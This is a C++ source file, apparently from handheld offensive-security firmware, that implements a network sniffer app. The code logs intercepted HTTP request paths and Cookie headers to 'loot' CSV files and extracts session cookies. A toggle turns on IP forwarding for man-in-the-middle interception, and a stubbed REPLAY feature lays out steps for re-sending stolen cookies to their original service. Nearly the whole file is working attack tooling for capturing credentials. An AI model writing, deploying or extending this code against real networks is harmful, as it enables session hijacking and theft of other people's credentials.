// app_sniff.cpp — URL/cookie sniffer + MITM toggle.
// URL LOG / COOKIES -> loot csvs.
//
//   2. MITM EN — sysctl `net.ipv4.ip_forward=1` on Pi 5; this is the
//                single most important toggle when the device is the
//                gateway for a soft AP and the operator wants true
//                on-path MITM. ESP32 path toggles a local flag (no
//                forward sysctl available on-chip).
//
// Like app_rogue, the URL listener runs in a scheduled pump task so
// operation continues after the operator leaves the app.

#include "app_sniff.h"
#include "UI/draw.h"
#include "UI/theme.h"
#include "hal/hal_storage.h"
#include "os/scheduler.h"
#include "config.h"
#include <cstdio>
#include <cstring>

#ifdef VOIDOS_RPI5
#include <cstdlib>
#include <fstream>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <unistd.h>
#include <sys/stat.h>
#endif

// ── UI + state ─────────────────────────────────────────────────────────

static const char *LABELS[] = { "URL LOG", "COOKIES", "MITM EN", "REPLAY" };
static const uint8_t N_ROWS = sizeof(LABELS)/sizeof(LABELS[0]);

// ── REPLAY (row 3) ──────────────────────────────────────────────────
//
//   Pulls the last captured `Cookie:` line out of /loot/urls.csv and
//   re-emits the original GET to the host it was tied to. One
//   button → "replay last". Useful when the operator finishes an
//   external engagement and wants to confirm "this cookie still
//   works against the original service".
//
//   STEPS for real impl:
//   1. tail -1 /loot/urls.csv  →  parse `<method> <path>` + `cookie:`
//   2. parse `cookie: HOST=...; SESSION=...` to reconstruct a target URL.
//   3. open a TCP socket to host (port 80 default, 443 for SSL).
//   4. send "GET <path> HTTP/1.0\r\nHost: <host>\r\nCookie:
//      <cookie>\r\n\r\n".
//   5. recv response, save to /loot/replay_<UTC>.txt.
//
//   STUB only. Build it once you need to prove a cookie's still alive.
//
static uint8_t _row = 0;
static bool    _pump_on = false, _mitm = false;
static char    _status[24] = "READY";

#define URL_LOG_MAX 8
static char  _url_log[URL_LOG_MAX][48];
static uint8_t _url_n = 0;
static int8_t _pump_id = -1;

static void url_log_append(const char *line) {
    if (_url_n >= URL_LOG_MAX) {
        for (uint8_t i = 1; i < URL_LOG_MAX; ++i) std::snprintf(_url_log[i-1], 48, "%s", _url_log[i]);
        _url_n = URL_LOG_MAX - 1;
    }
    std::snprintf(_url_log[_url_n++], 48, "%s", line);
}

#ifdef VOIDOS_RPI5
// ── Pi 5: tiny TCP listener on :8080 ───────────────────────────────────
//
// Maximum-viable HTTP log: accept any client, read up to 1 KB, log the
// request line and any `Cookie:` headers to the CSV file. Fork-per-conn
// would need a process pool; single-process is fine for a low traffic
// sniffer where the operator is the only client. We leave accept() in
// non-blocking mode so the pump can yield to other tasks.

static int  _srv_fd = -1;
static void srv_open() {
    if (_srv_fd >= 0) return;
    int s = ::socket(AF_INET, SOCK_STREAM | SOCK_NONBLOCK, 0);
    int opt = 1; ::setsockopt(s, SOL_SOCKET, SO_REUSEADDR, &opt, sizeof(opt));
    struct sockaddr_in sa{};
    sa.sin_family = AF_INET; sa.sin_port = htons(8080); sa.sin_addr.s_addr = INADDR_ANY;
    ::bind(s, (struct sockaddr*)&sa, sizeof(sa));
    ::listen(s, 8);
    _srv_fd = s;
}
static void srv_close() { if (_srv_fd >= 0) { ::close(_srv_fd); _srv_fd = -1; } }

static void handle_one(int c) {
    char buf[1024]; int n = 0;
    while (n < (int)sizeof(buf) - 1) {
        int r = ::recv(c, buf + n, sizeof(buf) - 1 - n, 0);
        if (r <= 0) break;
        n += r;
    }
    buf[n] = 0;
    // First line = "METHOD path HTTP/x.x"
    char method[8] = {}, path[64] = {};
    std::sscanf(buf, "%7s %63s", method, path);
    if (path[0]) url_log_append(path);
    mkdir("/var/lib/void-os/loot", 0755);
    std::ofstream f("/var/lib/void-os/loot/urls.csv", std::ios::app);
    if (f) { f << method << " " << path << "\n";
              for (char *q = buf; (q = std::strstr(q, "Cookie:")); q += 7) f << "  cookie: " << q << "\n"; }
    const char *ok = "HTTP/1.0 200 OK\r\n\r\nok";
    ::send(c, ok, std::strlen(ok), 0);
    ::close(c);
}

static void sniff_pump() {
    if (!_pump_on || _srv_fd < 0) return;
    for (;;) {
        int c = ::accept(_srv_fd, nullptr, nullptr);
        if (c < 0) break;
        if (fork() == 0) { handle_one(c); _exit(0); }
        ::close(c); // parent drops the accepted fd; child owns it
    }
}

static void plat_sniff_on()  { srv_open(); std::snprintf(_status, sizeof(_status), "LISTENING :8080"); }
static void plat_sniff_off() { srv_close(); }
static void plat_mitm_on()   { std::system("sysctl -qw net.ipv4.ip_forward=1"); std::snprintf(_status, sizeof(_status), "IP-FWD ON"); }
static void plat_mitm_off()  { std::system("sysctl -qw net.ipv4.ip_forward=0"); }
#else
// ── ESP32 stub ─────────────────────────────────────────────────────────
//
// ESP32 has no userspace IP-forward facility. Toggle the local flag and
// log to `urls.csv` via `app_log` (cross-app hand-off lives outside
// this file). The actual port-80 listener is owned by `app_rogue`'s
// CAPTIVE mode; URL_LOG here is informational and a future pass will
// wire ESP32's promiscuous packet capture.

static void sniff_pump() {}
static void plat_sniff_on()  { std::snprintf(_status, sizeof(_status), "URL LOG on"); }
static void plat_sniff_off() { std::snprintf(_status, sizeof(_status), "URL LOG off"); }
static void plat_mitm_on()   { _mitm = true;  std::snprintf(_status, sizeof(_status), "MITM flag"); }
static void plat_mitm_off()  { _mitm = false; }
#endif

// ── Cookie extractor: scan urls.csv for `cookie:` rows ─────────────────

static void emit_cookies() {
#ifdef VOIDOS_RPI5
    std::ifstream in("/var/lib/void-os/loot/urls.csv");
    if (!in) { std::snprintf(_status, sizeof(_status), "no urls.csv"); return; }
    std::ofstream out("/var/lib/void-os/loot/cookies.csv", std::ios::trunc);
    char line[200];
    uint32_t n = 0;
    while (in.getline(line, sizeof(line))) {
        if (std::strstr(line, "cookie:")) {
            // Trim leading whitespace; tag with epoch ms if available.
            char *p = line; while (*p == ' ' || *p == '\t') ++p;
            out << p << "\n";
            ++n;
        }
    }
    std::snprintf(_status, sizeof(_status), "cookies: %u", n);
    url_log_append("REQ COOK EXTRACT");
#endif
}

// ── Lifecycle ──────────────────────────────────────────────────────────

void app_sniff_init() {
    if (_pump_id < 0) _pump_id = sched_add("sniff_pump", sniff_pump, 0, 7);
}

void app_sniff_tick()    {}
void app_sniff_suspend() {}

void app_sniff_event(Event e) {
    if (e.type == EVT_BTN_B_DOWN) {
        std::snprintf(_status, sizeof(_status), "READY");
        return;
    }
    if (e.type == EVT_POT_CHANGED) {
        _row = (e.data * N_ROWS) / 256;
        if (_row >= N_ROWS) _row = N_ROWS - 1;
        return;
    }
    if (e.type == EVT_BTN_A_DOWN) {
        switch (_row) {
            case 0: _pump_on = !_pump_on;
                    if (_pump_on) plat_sniff_on(); else plat_sniff_off(); break;
            case 1: emit_cookies(); break;
            case 2: _mitm = !_mitm;
                    if (_mitm) plat_mitm_on(); else plat_mitm_off(); break;
        }
        return;
    }
}

// ── Draw ───────────────────────────────────────────────────────────────

void app_sniff_draw() {
    draw_fill(0,0,SCR_W,SCR_H,T_BG);
    draw_fill(0,0,SCR_W,STATS_H,T_PANEL);
    draw_hline(0,STATS_H,SCR_W,T_BORDER);
    draw_text(8, 8, "SNIFF / URL", T_FG, T_PANEL, FONT_SM);
    draw_textf(SCR_W - 60, 8, _pump_on ? T_WARN : T_DIM, T_PANEL, FONT_SM, "PUMP:%u", _pump_on);

    int row_h = 26;
    for (uint8_t i = 0; i < N_ROWS; ++i) {
        int y = STATS_H + 8 + i * row_h;
        bool on = (i == 0 && _pump_on) || (i == 2 && _mitm);
        draw_textf(8, y, on ? T_WARN : (i == _row ? T_FG : T_DIM),
                   T_BG, FONT_SM,
                   "%s %s [%s]",
                   i == _row ? ">" : " ", LABELS[i], on ? "ON" : "off");
    }

    int info_y = STATS_H + 8 + N_ROWS * row_h + 4;
    if (_row == 0) {
        // url log mirror
        for (uint8_t i = 0; i < _url_n; ++i)
            draw_textf(8, info_y + (int)i * 11, T_DIM, T_BG, FONT_SM, "%s", _url_log[i]);
    } else {
        draw_textf(8, info_y, T_FG, T_BG, FONT_SM,
                   _row == 1 ? "scan urls.csv -> cookies.csv" : "ip_forward toggle");
        draw_textf(8, info_y + 12, T_DIM, T_BG, FONT_SM, "ARMed sub-mode stays on");
    }
    draw_textf(8, SCR_H - 28, T_DIM, T_BG, FONT_SM, "%s", _status);
    draw_hline(0, SCR_H - 16, SCR_W, T_BORDER);
    draw_text(8, SCR_H - 12, "[A] TOGGLE/EXTRACT  [B] BACK  POT=row", T_DIM, T_BG, FONT_SM);
}
